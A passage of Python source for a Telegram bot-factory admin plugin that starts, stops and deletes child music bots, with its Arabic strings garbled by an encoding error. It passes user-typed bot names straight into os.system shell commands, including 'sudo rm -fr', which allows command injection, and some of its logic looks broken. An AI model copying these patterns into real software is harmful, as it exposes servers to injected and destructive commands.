    print("â°âª ğ—˜ğ—¡ğ—§ğ—²ğ—¥ ğ—® ğ—¡ğ—²ğ˜„ ğ—•ğ—¼ğ˜â™ª â«â±")


  


# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚
# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚[ğ—©.ğ—˜.ğ—š.ğ—”]â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚




@Client.on_message(filters.command("Ø­Ø°Ù Ø¨ÙˆØª", "") & filters.private)
async def deletbot(client, message):  
   if not message.from_user.id in SUDORS:
     for x in Bots:
         bot = x[0]
         if int(x[1]) == message.from_user.id:       
           os.system(f"sudo rm -fr Maked/{bot}")
           os.system(f"screen -XS {bot} quit")
           Bots.remove(x)
           xx = {"username": bot}
           db.delete_one(xx)
           return await message.reply_text("<blockquote>ØªÙ€Ù… Ø·Ù€Ø±Ø¯ Ø¨Ù€ÙˆØªÙ€Ùƒ Ù…Ù† Ø§Ù„Ø´ÙŠØ®..</blockquote>")
     return await message.reply_text("<blockquote>Ù„Ù… ØªÙ‚Ù… Ø¨ØµÙ†Ø¹ Ø¨ÙˆØªØ§Øª</blockquote>")
   try:
      bot = await client.ask(message.chat.id, "<blockquote>Ø§Ø±Ø³Ù€Ù„ Ù…Ù€Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª</blockquote>", timeout=300)
   except:
      return
   bot = bot.text.replace("@", "")
   bot_found = False
   for x in Bots:
       if x[0] == bot:
          Bots.remove(x)
          xx = {"username": bot}
          db.delete_one(xx)
          bot_found = True
          break
   if not bot_found:
       return await message.reply_text("<blockquote>ØªÙ… Ø­Ø°Ù Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ù…Ù† Ù‚Ø¨Ù„..ØŸ</blockquote>")
   os.system(f"sudo rm -fr Maked/{bot}")
   os.system(f"screen -XS {bot} quit")
   await message.reply_text(f"<blockquote><b>ØªÙ… Ø­Ù€Ø°Ù Ø§Ù„Ø¨Ù€ÙˆØª Ø¨Ù†Ù€Ø¬Ø§Ø­ :  @{bot}</b></blockquote>")



# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚
# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚[ğ—©.ğ—˜.ğ—š.ğ—”]â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚




@Client.on_message(filters.command("Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ù‡", ""))
async def botat(client, message):  
  if not message.from_user.id in SUDORS:
      return
  o = 0
  text = "<blockquote><b>â”€â”€ã€Œ Ù‚Ù€Ø§Ø¦Ù€Ù…Ø© Ø§Ù„Ù€Ø¨Ù€ÙˆØªÙ€Ø§Øª Ù…Ù€Ù† Ø§Ù„Ø´ÙŠØ® ã€â”€â”€</b></blockquote>\n\n"  
  total_bots = len(Bots)
  if total_bots > 0:
      text += f"<blockquote><b>Ø¹Ø¯Ø¯ Ø§Ù„Ø¨ÙˆØªØ§Øª :  {total_bots}</b></blockquote>\n\n"  
  for x in Bots:
      o += 1
      if len(x) >= 3:
          text += f"<blockquote><b>{o}- á´…á´‡á´  : @{x[2]} | Ê™á´á´› : @{x[0]}</blockquote>\n</b>"
      else:
          text += "<blockquote><b>Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØªØ§Øª</b></blockquote>"
  if o == 0:
      return await message.reply_text("<blockquote>Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª ÙÙ€ÙŠ Ø§Ù„Ø´ÙŠØ® Ø¹Ø²ÙŠØ²ÙŠ Ø§Ù„Ù…Ø·ÙˆØ±</blockquote>")  
  await message.reply_text(text)



# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚
# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚[ğ—©.ğ—˜.ğ—š.ğ—”]â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚


@Client.on_message(filters.command("Ø§ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØª", ""))
async def stop_specific_bot(c, message):
 if message.from_user.id in [7623838169, 8122544723, 8176410693]:    
    bot_username = await c.ask(message.chat.id, "Ø§Ø±Ø³Ù€Ù„ Ù…Ù€Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª", timeout=300)
    bot_username = bot_username.text.replace("@", "")    
    if not bot_username:
        await message.reply_text("**~ Ø®Ø·Ø£: ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ ØªØ­Ø¯ÙŠØ¯ Ø§Ø³Ù… Ø§Ù„Ø¨ÙˆØª.**")
        return
    msg = await message.reply("Ø¬Ø§Ø±ÙŠ Ø§ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØª...")
    await asyncio.sleep(2)
    await msg.delete()
    if not os.path.exists('Maked'):
        await message.reply_text("**~ Ø®Ø·Ø£: Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¬Ù„Ø¯ Maked.**")
        return
    bot_found = False  
    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder) and bot_username in folder: 
            os.system(f'cd Maked/{folder} && chmod +x * && screen -X -S {folder} quit')
            bot_found = True
            break  
    if not bot_found:
        await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØª Ø¨Ù‡Ø°Ø§ Ø§Ù„Ø§Ø³Ù… Ù„ÙŠÙ‚Ø§ÙÙ‡**")
    else:
        await message.reply_text(f"**ØªÙ… Ø§ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØª : @{bot_username}**")
 else:
    await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø§Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")


# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚
# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚[ğ—©.ğ—˜.ğ—š.ğ—”]â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚



@Client.on_message(filters.command("Ø§ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØªØ§Øª", ""))
async def stooop_Allusers(c, message):
 if message.from_user.id in [7623838169, 8122544723, 8176410693]:
    n = 0
    msg = await message.reply("Ø¬Ø§Ø±ÙŠ Ø§ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØªØ§Øª")
    await asyncio.sleep(2)
    await msg.delete()
    if not os.path.exists('Maked'):
        await message.reply_text("**~ Ø®Ø·Ø£: Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¬Ù„Ø¯ Maked.**")
        return
    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder):
            os.system('cd Maked/' + folder + ' && chmod +x * && screen -X -S ' + folder.replace("@", "") + ' quit')  
            n += 1
    if n == 0:
        await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª Ù„ÙŠÙ‚Ø§ÙÙ‡Ø§**")
    else:
        await message.reply_text(f"**ØªÙ… Ø§ÙŠÙ‚Ø§Ù :  {n} Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­**")
 else:
    await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø§Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")




# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚
# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚[ğ—©.ğ—˜.ğ—š.ğ—”]â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚



@Client.on_message(filters.command("ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª", ""))
async def start_single_bot(client, message):
 if message.from_user.id in [7623838169, 8122544723, 8176410693]:
    n = 0
    try:
        bot_username = await client.ask(message.chat.id, "Ø§Ø±Ø³Ù€Ù„ Ù…Ù€Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª", timeout=300)
        bot_username = bot_username.text.replace("@", "")        
        if not bot_username:
            await message.reply_text("**Ø®Ø·Ø§Ø¡ : Ù„Ù… ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¹Ø±Ù**")
            return        
        msg = await message.reply("**Ø¬Ø§Ø±ÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª..**")
        await asyncio.sleep(2)
        await msg.delete()
        if not os.path.exists('Maked'):
            await message.reply_text("**~ Ø®Ø·Ø£: Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¬Ù„Ø¯ Maked.**")
            return
        bot_folder = f"Maked/{bot_username}"
        if os.path.exists(bot_folder) and re.search('[Bb][Oo][Tt]', bot_username):
            os.system(f'cd {bot_folder} && screen -d -m -S {bot_username.replace("@", "")} python3 -m VeGaXMusic')
            n += 1
        if n == 0:
            await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØª Ø¨Ù‡Ø°Ø§ Ø§Ù„Ø§Ø³Ù… Ù„ØªØ´ØºÙŠÙ„Ù‡.**")
        else:
            await message.reply_text(f"**ØªÙ… ØªØ´ØºÙŠÙ„ Ø¨ÙˆØª : @{bot_username} **")
    except Exception as e:
        await message.reply_text(f"**~ Ø®Ø·Ø£: {str(e)}**")
 else:
     await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø§Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")


# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚
# â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚[ğ—©.ğ—˜.ğ—š.ğ—”]â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚â–‚



@Client.on_message(filters.command("ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª", ""))
async def start_Allusers(c, message):
 if message.from_user.id in [7623838169, 8122544723, 8176410693]:
    n = 0
    msg = await message.reply("Ø¬Ø§Ø±ÙŠ ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª")
    await asyncio.sleep(2)
    await msg.delete()
    if not os.path.exists('Maked'):
        await message.reply_text("**~ Ø®Ø·Ø£: Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¬Ù„Ø¯ Maked.**")
        return
    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder):
            os.system('cd Maked/' + folder + ' && screen -d -m -S ' + folder.replace("@", "") + ' python3 -m VeGaXMusic')  
            n += 1
    if n == 0:
        await message.reply_text("**Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØªØ§Øª Ù„ØªØ´ØºÙŠÙ„Ù‡Ø§**")
    else:
        await message.reply_text(f"**ØªÙ… ØªØ´ØºÙŠÙ„ :  {n} Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­**")
 else:
    await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø§Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")


@Client.on_message(filters.command("Ø­Ø°Ù Ø§Ù„Ø¨ÙˆØªØ§Øª", "") & filters.private)
async def delBots2(client, message):
    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø­Ø°Ù", callback_data="confirm_delete")],
                [InlineKeyboardButton("Ø¥Ù„ØºØ§Ø¡", callback_data="cancel_delete")]
            ]
        )
        await message.reply_text(
            "Ù„ØªØ£ÙƒÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§ØªØŒ Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ø£Ø¯Ù†Ø§Ù‡:",
            reply_markup=keyboard
        )
    else:
        await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")

@Client.on_callback_query(filters.regex("confirm_delete"))
async def confirm_delete(client, callback_query):
    bot_found = False

    for bot in Bots[:]: 
        Bots.remove(bot)
        xx = {"username": bot}
        db.delete_one(xx)
        bot_found = True

        for folder in os.listdir("Maked"):
            if re.search('[Bb][Oo][Tt]', folder):
                shutil.rmtree(f"Maked/{folder}", ignore_errors=True)
                os.system(f"screen -XS {folder} quit")
                os.system('cd Maked/' + folder + ' && chmod +x * && screen -X -S ' + folder.replace("@", "") + ' quit')

    if bot_found:
        await callback_query.message.edit_text("ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø¨Ù†Ø¬Ø§Ø­ âœ…")
    else:
        await callback_query.message.edit_text("Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø¨ÙˆØªØ§Øª Ù„Ø­Ø°ÙÙ‡Ø§")

@Client.on_callback_query(filters.regex("cancel_delete"))
async def cancel_delete(client, callback_query):
    await callback_query.message.edit_text("ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø­Ø°Ù âŒ")


@Client.on_message(filters.command(["Ø§Ù„Ø§Ø³ÙƒØ±ÙŠÙ†Ø§Øª Ø§Ù„Ù…ÙØªÙˆØ­Ù‡"], ""))
async def kinhsker(client: Client, message):
 if message.from_user.id in [7623838169, 8122544723, 8176410693]:
    n = 0
    response_message = "<b>â”€â”€ã€Œ  Ø§Ù„Ø§Ø³ÙƒØ±ÙŠÙ†Ø§Øª Ø§Ù„Ù…ÙØªÙˆØ­Ù‡ Ù…Ù† Ø§Ù„Ø´ÙŠØ®ã€â”€â”€</b>\n\n"
    for screen in os.listdir("/var/run/screen/S-root"):
        n += 1
        response_message += f"{n} - ( `{screen}` )\n"
    await message.reply_text(response_message) 

@Client.on_message(filters.command("ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµØ§Ù†Ø¹", ""))
async def update_factory(client: Client, message):
    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
        try:
            confirm_msg = await message.reply(
                "Ù‡Ù„ Ø§Ù†Øª Ù…ØªØ§ÙƒØ¯ Ù…Ù† ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø´ÙŠØ®",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ØªØ­Ø¯ÙŠØ«", callback_data="confirm_update")],
                    [InlineKeyboardButton("Ø¥Ù„ØºØ§Ø¡", callback_data="cancel_update")]
                ])
            )
        except Exception as e:
            await message.reply_text(f"ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ£ÙƒÙŠØ¯: {e}")
    else:
        await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")

@Client.on_callback_query(filters.regex("^confirm_update$"))
async def confirm_update(client, callback_query):
    try:
        msg = await callback_query.message.edit_text("Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…ØµÙ†Ø¹...")
        await asyncio.sleep(2)
        await msg.delete()
        for bot in Bots[:]:
            Bots.remove(bot)
            username = bot[0]
            xx = {"username": username}
            db.delete_one(xx)            
            for folder in os.listdir("Maked"):
                if re.search('[Bb][Oo][Tt]', folder):
                    try:
                        shutil.rmtree(f"Maked/{folder}", ignore_errors=True)
                        os.system(f"screen -XS {folder} quit")
                        os.system(f'cd Maked/{folder} && chmod +x * && screen -X -S {folder.replace("@", "")} quit')
                    except Exception as e:
                        print(f"Error cleaning bot {folder}: {e}")        
        db.update_one({"some_field": "some_value"}, {"$set": {"new_field": "new_value"}})
        args = [sys.executable, "main.py"]
        environ = os.environ.copy()
        os.execle(sys.executable, *args, environ)
        await callback_query.message.reply_text("ØªÙ… ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµØ§Ù†Ø¹ Ø¨Ù†Ø¬Ø§Ø­")
    except Exception as e:
        await callback_query.message.reply_text(f"ÙØ´Ù„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…ØµÙ†Ø¹: {e}")

@Client.on_callback_query(filters.regex("^cancel_update$"))
async def cancel_update(client, callback_query):
    await callback_query.message.edit_text("ØªÙ… Ø§Ù„ØºØ§Ø¡ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø¨Ù†Ø¬Ø§Ø­")


# ============ Ø¯ÙˆØ§Ù„ ÙƒÙˆÙƒÙŠØ² Ùˆ Ø§Ù„ÙŠÙˆØªÙŠÙˆØ¨ ============

youtubee = ""

@Client.on_message(filters.command("ØªØ¹ÙŠÙ† ÙƒÙˆÙƒÙŠØ²", ""))
async def set_youtube(client: Client, message: Message):
    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
        try:
            youtube_msg = await client.ask(
                chat_id=message.chat.id, 
                text="Ø£Ø±Ø³Ù„ Ø±Ø§Ø¨Ø· Ù…Ù„ÙØ§Øª ØªØ¹Ø±ÙŠÙ Ø§Ù„Ø§Ø±ØªØ¨Ø§Ø· : ÙƒÙˆÙƒÙŠØ²", 
                timeout=30
            )
            global youtubee
            youtubee = youtube_msg.text
            await message.reply_text("ØªÙ… ØªØ¹ÙŠÙ† Ù…Ù„ÙØ§Øª ØªØ¹Ø±ÙŠÙ Ø§Ù„Ø§Ø±ØªØ¨Ø§Ø· Ø¨Ù†Ø¬Ø§Ø­")
        except TimeoutError:
            await message.reply_text("â° Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ø¯Ø¯ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø§Ø¨Ø·.")
        except Exception as e:
            await message.reply_text(f"âš ï¸ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ¹ÙŠÙŠÙ† Ù…Ù„ÙØ§Øª: {e}")
    else:
        await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")
        
@Client.on_message(filters.command("Ø¥Ø¹Ø§Ø¯Ø© ØªÙ‡ÙŠØ¦Ø©", ""))
async def restart_youtube(client: Client, message: Message):
    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
        try:
            save_file()
            await message.reply_text("âœ”ï¸ ØªÙ… ØªØ­Ø¯ÙŠØ« Ù…Ù„ÙØ§Øª Ø¨Ù†Ø¬Ø§Ø­.")
        except Exception as e:
            await message.reply_text(f"âš ï¸ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ­Ø¯ÙŠØ«: {e}")
    else:
        await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")
        
def save_file():
    global youtubee
    try:
        headers = {
            'Accept': 'text/plain',
            'User-Agent': 'python-requests'
        }
        file_path="/root/cookies/cookies.txt"
        if os.path.exists(file_path):
            os.remove(file_path)
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        response = requests.get(f'{youtubee}', headers=headers)
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(response.text)
    except Exception as error:
        print('Error:', str(error))

        

# ============ Ø¯ÙˆØ§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ùˆ Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„ØµØ§Ù†Ø¹ ============
        
@Client.on_message(filters.command("Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØµØ§Ù†Ø¹", ""))
async def Sudo_Start(client: Client, message):
    if message.from_user.id not in SUDORS:
        return await message.reply_text("Ù‡Ø°Ø§ Ø§Ù„Ø£Ù…Ø± ÙŠØ®Øµ Ø§Ù„Ø´ÙŠØ®")    
    try:
        global OFF
        bot_user = await client.get_me()
        OFF = "Ù…Ø¹Ø·Ù„ >> â" if globals().get('OFF', False) else "Ù…ÙØ¹Ù„ >> âœ…"        
        total_users, total_SUDORS, total_blocked, total_bots = await asyncio.gather(
            asyncio.to_thread(len, get_users()),
            asyncio.to_thread(len, SUDORS),
            asyncio.to_thread(len, blocked),
            asyncio.to_thread(len, Bots)
        )        
        photo = None
        if bot_user.photo:
            photo = await client.download_media(bot_user.photo.big_file_id)        
        caption = f"""
<b>{bot_user.first_name}</b>
<blockquote>
<u>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØµØ§Ù†Ø¹ Ø§Ù„Ø´ÙŠØ®</u>
ÙˆØ¶Ø¹ Ø§Ù„ØµØ§Ù†Ø¹ : [ {OFF} ]

â•®â– Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† : {total_users}
 â”‚â– Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ† : {total_SUDORS}
 |â– Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ† : {total_blocked}
â•¯â– Ø¹Ø¯Ø¯ Ø§Ù„Ø¨ÙˆØªØ§Øª : {total_bots}
</blockquote>
"""
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("êœ±Êœá´‡Éªá´‹Êœ", url="https://t.me/kafra_wi_1")]
        ])
        if photo:
            await message.reply_photo(
                photo=photo,
                caption=caption,
                reply_markup=reply_markup
            )
            if os.path.exists(photo):
                os.remove(photo)
        else:
            await message.reply_text(
                text=caption,
                reply_markup=reply_markup
            )            
    except Exception as e:
        await message.reply(f"âš ï¸ Ø­Ø¯Ø« Ø®Ø·Ø£: {str(e)}")
